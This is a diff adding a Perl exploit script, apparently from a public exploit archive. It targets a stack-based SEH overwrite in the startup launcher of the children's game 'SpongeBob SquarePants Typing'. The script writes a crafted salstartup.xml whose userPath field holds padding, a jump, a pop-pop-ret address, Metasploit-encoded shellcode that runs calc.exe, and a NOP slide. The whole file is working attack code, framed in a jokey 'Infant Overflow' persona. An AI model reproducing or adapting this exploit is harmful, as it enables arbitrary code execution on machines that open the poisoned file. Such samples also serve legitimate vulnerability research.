@@ -1,0 +1,283 @@
+# SEH overwrite exploit for SpongeBob SquarePants Typing
+# from The Learning Company (http://goo.gl/1EHaD)
+# Date: May 4th 2011
+# Author: Infant Overflow
+# 
+#	    .-.
+#	    ) (
+#	   -   -
+#	  |_____|
+#	  /     \
+#	 |  ~~~	 |
+#	 | ~~~~~ |
+#	 | ~~~~~ |
+#	 | ~~~~~ |
+#	 \_______/ 
+#
+# Fresh out the womb laying the smack down on SpongeBob
+# I like my sploits like I like my milk... fresh
+#
+# Shoutz to Pops, Elmo, my girl Dora, Handy M, and Thomas the Mother f'n Train	
+#
+# Tested on WinXP SP3	  
+
+
+my $diaper = "A" x 1024; # Everyone needs some padding
+my $jumprope = "\xeb\x06\x90\x90"; # jump 6
+my $pacifier = pack('V',0x2110234D); # pop pop ret from mss32.dll <-- no /SAFESEH sucks like my pacifier!
+
+# windows/exec - 247 bytes
+# http://www.metasploit.com
+# Encoder: x86/shikata_ga_nai
+# EXITFUNC=process, CMD=c:\windows\system32\calc.exe
+my $shellcode =
+"\xd9\xf6\xba\x24\xb5\x20\x67\xd9\x74\x24\xf4\x5f\x2b\xc9" .
+"\xb1\x38\x31\x57\x17\x03\x57\x17\x83\xcb\x49\xc2\x92\xef" .
+"\x5a\x8a\x5d\x0f\x9b\xed\xd4\xea\xaa\x3f\x82\x7f\x9e\x8f" .
+"\xc0\x2d\x13\x7b\x84\xc5\xa0\x09\x01\xea\x01\xa7\x77\xc5" .
+"\x92\x09\xb8\x89\x51\x0b\x44\xd3\x85\xeb\x75\x1c\xd8\xea" .
+"\xb2\x40\x13\xbe\x6b\x0f\x86\x2f\x1f\x4d\x1b\x51\xcf\xda" .
+"\x23\x29\x6a\x1c\xd7\x83\x75\x4c\x48\x9f\x3e\x74\xe2\xc7" .
+"\x9e\x85\x27\x14\xe2\xcc\x4c\xef\x90\xcf\x84\x21\x58\xfe" .
+"\xe8\xee\x67\xcf\xe4\xef\xa0\xf7\x16\x9a\xda\x04\xaa\x9d" .
+"\x18\x77\x70\x2b\xbd\xdf\xf3\x8b\x65\xde\xd0\x4a\xed\xec" .
+"\x9d\x19\xa9\xf0\x20\xcd\xc1\x0c\xa8\xf0\x05\x85\xea\xd6" .
+"\x81\xce\xa9\x77\x93\xaa\x1c\x87\xc3\x12\xc0\x2d\x8f\xb0" .
+"\x15\x57\xd2\xde\xe8\xd5\x68\xa7\xeb\xe5\x72\x87\x83\xd4" .
+"\xf9\x48\xd3\xe8\x2b\x2d\x2b\xa3\x76\x07\xa4\x6a\xe3\x1a" .
+"\xa9\x8c\xd9\x58\xd4\x0e\xe8\x20\x23\x0e\x99\x25\x6f\x88" .
+"\x71\x57\xe0\x7d\x76\xc4\x01\x54\x15\xd0\xa1\x20\xb3\x4a" .
+"\x3e\xa0\x34\xe1\xe2\x4d\xc2\x76\x6f\xd7\x59\x4b\xbd\x4b" .
+"\xc1\xca\xad\x10\x2b\x69\x56\xb2\x33";
+
+my $rattle ='<?xml version="1.0" standalone="yes"?>
+<startup>
+  <userPath>"';
+
+my $playpen = '"</userPath>
+  <cdName>"SpongeBob SquarePants Typing"</cdName>
+  <cdAge>7-10</cdAge>
+  <music>1000</music>
+  <pdfInstaller>"E:\INSTALL\ACROBAT\Ver50\Acrobat Reader 5 Installer.exe"</pdfInstaller>
+  <signin>
+    <execute>yes</execute>
+    <style>tlc</style>
+    <age>4To6</age>
+    <rscFile>default</rscFile>
+  </signin>
+  <disk1>
+    <filename>E:\TLC\383167-CD</filename>
+    <cdName>"SpongeBob SquarePants Typing"</cdName>
+  </disk1>
+  <screenRSC>salstartup.rsc</screenRSC>
+  <screen>
+    <element>
+      <condition>all</condition>
+      <type>scene</type>
+      <id>9100</id>
+    </element>
+    <element>
+      <condition>all</condition>
+      <type>toon</type>
+      <x>0</x>
+      <y>0</y>
+      <id>9100</id>
+      <startFrame>1</startFrame>
+    </element>
+    <mainPlayButton>
+      <condition>all</condition>
+      <type>fob</type>
+      <class>play</class>
+      <cdCheck>disk1</cdCheck>
+      <target>"C:\Program Files\The Learning Company\SpongeBob SquarePants Typing\SPT.exe"</target>
+      <postLaunch>wait</postLaunch>
+      <x>461</x>
+      <y>60</y>
+      <id>9124</id>
+    </mainPlayButton>
+    <helpButton>
+      <condition>all</condition>
+      <type>fob</type>
+      <class>extension</class>
+      <cdCheck></cdCheck>
+      <target>"C:\Program Files\The Learning Company\SpongeBob SquarePants Typing\User&apos;s Guide.pdf"</target>
+      <parameters></parameters>
+      <postLaunch>wait</postLaunch>
+      <x>543</x>
+      <y>158</y>
+      <id>9126</id>
+    </helpButton>
+    <uninstallButton>
+      <condition>all</condition>
+      <type>fob</type>
+      <class>uninstall</class>
+      <target>C:\WINDOWS\TLCUninstall.exe</target>
+      <parameters>-l</parameters>
+      <crc>"C:\Program Files\The Learning Company\SpongeBob SquarePants Typing\Uninstall.xml"</crc>
+      <postLaunch>exit</postLaunch>
+      <x>514</x>
+      <y>373</y>
+      <id>9125</id>
+    </uninstallButton>
+    <onlineButton>
+      <condition>all</condition>
+      <type>fob</type>
+      <class>link</class>
+      <cdCheck></cdCheck>
+      <target>http://redirect.expressit.com/redirect.asp?resku=383167&action_id=Launcher</target>
+      <parameters></parameters>
+      <postLaunch>wait</postLaunch>
+      <x>538</x>
+      <y>263</y>
+      <yy>375</yy>
+      <id>9130</id>
+    </onlineButton>
+    <EregButton>
+      <condition>all</condition>
+      <type>fob</type>
+      <class>install</class>
+      <cdCheck></cdCheck>
+      <target>"C:\Program Files\The Learning Company\SpongeBob SquarePants Typing\ereg\ereg32.exe"</target>
+      <parameters></parameters>
+      <postLaunch>wait</postLaunch>
+      <x>522</x>
+      <y>324</y>
+      <id>9129</id>
+    </EregButton>
+    <SellScreen>
+      <condition>all</condition>
+      <type>fob</type>
+      <class>link</class>
+      <cdCheck>disk1</cdCheck>
+      <target>startup:startup/BrandingPage</target>
+      <parameters></parameters>
+      <postLaunch>wait</postLaunch>
+      <x>543</x>
+      <y>207</y>
+      <id>9128</id>
+    </SellScreen>
+  </screen>
+  <BrandingPage>
+    <element>
+      <condition>all</condition>
+      <type>toon</type>
+      <id>5000</id>
+    </element>
+    <screenSaverButton>
+      <condition>all</condition>
+      <type>fob</type>
+      <class>install</class>
+      <cdCheck>disk1</cdCheck>
+      <target>E:\SailorificStuff\sbscreen_setup.exe</target>
+      <parameters></parameters>
+      <postLaunch>wait</postLaunch>
+      <x>546</x>
+      <y>188</y>
+      <id>5054</id>
+    </screenSaverButton>
+    <backButton>
+      <condition>all</condition>
+      <type>fob</type>
+      <class>link</class>
+      <target>startup:startup/screen</target>
+      <x>537</x>
+      <y>263</y>
+      <id>5055</id>
+    </backButton>
+  </BrandingPage>
+  <sysReq>
+    <execute>yes</execute>
+    <pc>
+      <processor>
+        <family>pentium</family>
+        <speed>266</speed>
+        <msgType>warn</msgType>
+        <msgText>"266 MHz Pentium or faster is recommended."</msgText>
+      </processor>
+      <os>
+        <Win95>no</Win95>
+        <Win98>yes</Win98>
+        <WinMe>yes</WinMe>
+        <WinNT4>no</WinNT4>
+        <Win2000>yes</Win2000>
+        <WinXP>yes</WinXP>
+        <msgType>warn</msgType>
+        <msgText>"You operating system is not supported. Play at your own risk!"</msgText>
+      </os>
+      <diskSpace>
+        <mbAvailable>100</mbAvailable>
+        <msgType>ignore</msgType>
+        <msgText>"There is not enough hard disk space available to play!"</msgText>
+      </diskSpace>
+      <physicalRAM>
+        <mbAvailable>64</mbAvailable>
+        <msgType>warn</msgType>
+        <msgText>"There is not enough RAM available to play!"</msgText>
+      </physicalRAM>
+      <availableRAM>
+        <mbAvailable>64</mbAvailable>
+        <msgType>warn</msgType>
+        <msgText>You are low on memory!</msgText>
+      </availableRAM>
+      <display>
+        <width>800</width>
+        <height>600</height>
+        <bits>16</bits>
+        <msgType>fail</msgType>
+        <msgText>"Your display is not capable of 800 x 600 16-bit, thousands of colors."</msgText>
+      </display>
+      <sound>
+        <msgType>fail</msgType>
+        <msgText>"WAVE driver is not available."</msgText>
+      </sound>
+    </pc>
+    <mac>
+      <processor>
+        <family>ppc</family>
+        <speed>233</speed>
+        <msgType>warn</msgType>
+        <msgText>"233 MHz Powerpc or faster is recommended."</msgText>
+      </processor>
+      <os>
+        <minVersion>0860</minVersion>
+        <msgType>fail</msgType>
+        <msgText>"You must run System 8.6 or above!"</msgText>
+      </os>
+      <osX>
+        <minVersion>1004</minVersion>
+        <msgType>fail</msgType>
+        <msgText>"You must run OSX 10.04 or above!"</msgText>
+      </osX>
+      <diskSpace>
+        <mbAvailable>100</mbAvailable>
+        <msgType>ignore</msgType>
+        <msgText>"There is not enough hard disk space available to play!"</msgText>
+      </diskSpace>
+      <physicalRAM>
+        <mbAvailable>64</mbAvailable>
+        <msgType>warn</msgType>
+        <msgText>"There is not enough RAM available to play!"</msgText>
+      </physicalRAM>
+      <availableRAM>
+        <mbAvailable>0</mbAvailable>
+        <msgType>warn</msgType>
+        <msgText></msgText>
+      </availableRAM>
+      <colorDepth>
+        <minBits>16</minBits>
+        <msgType>warn</msgType>
+        <msgText>"Your display is not capable of 16-bit, thousands of colors."</msgText>
+      </colorDepth>
+      <sound>
+        <available>ignore</available>
+        <msgType>ignore</msgType>
+        <msgText></msgText>
+      </sound>
+    </mac>
+  </sysReq>
+</startup>';
+
+my $slide = "\x90" x 1000;
+
+open(myfile,'>salstartup.xml');
+print myfile $rattle.$diaper.$jumprope.$pacifier.$shellcode.$slide.$playpen;
